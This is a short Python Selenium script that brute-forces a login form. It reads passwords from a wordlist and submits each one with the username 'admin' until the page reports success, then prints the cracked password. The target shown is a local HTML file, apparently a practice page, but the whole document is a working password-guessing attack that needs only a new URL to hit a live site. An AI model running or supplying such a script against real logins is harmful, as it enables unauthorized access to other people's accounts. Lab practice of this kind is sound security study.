from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Load the wordlist
with open("wordlist.txt", "r") as f:
    passwords = [line.strip() for line in f]

# Set up Selenium WebDriver
driver = webdriver.Chrome()  # Make sure chromedriver is in PATH

# Open the local HTML page
driver.get("file:///FULL/PATH/TO/login.html")  # Replace with your actual path

username_field = driver.find_element(By.ID, "username")
password_field = driver.find_element(By.ID, "password")
submit_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit']")

# Try each password
for pwd in passwords:
    username_field.clear()
    password_field.clear()
    username_field.send_keys("admin")
    password_field.send_keys(pwd)
    submit_button.click()
    time.sleep(0.5)

    result_text = driver.find_element(By.ID, "result").text
    print(f"Trying: {pwd} -> {result_text}")
    if "successful" in result_text:
        print(f"[+] Password found: {pwd}")
        break

driver.quit()
